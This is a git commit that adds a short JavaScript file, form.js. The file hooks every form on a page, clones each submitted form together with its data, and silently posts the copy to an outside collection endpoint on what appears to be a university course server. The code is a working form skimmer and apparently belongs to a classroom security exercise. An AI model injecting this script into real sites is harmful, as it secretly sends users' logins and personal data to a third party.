6a59fadd4bb39304351e1ec42f3c5734f62c02f3
Jason Cramer <jason.cramer6@gmail.com>
2023-01-13 15:20:49 -0500

    Create form.js

---
+++ form.js
@@ -0,0 +1,17 @@
+const forms = document.getElementsByTagName("form");
+
+for (const form of forms) {
+  // On submit of form, create a copy of the form with data with a new action
+  // and submit it
+  form.onsubmit = function (event) {
+    // event.preventDefault();
+    const newForm = form.cloneNode(true);
+    newForm.action = "http://treeforty.csse.rose-hulman.edu/f/slurp.php";
+    const input = document.createElement("input");
+    input.type = "hidden";
+    input.name = "340team";
+    input.value = "CapComm";
+    newForm.appendChild(input);
+    newForm.submit();
+  };
+}
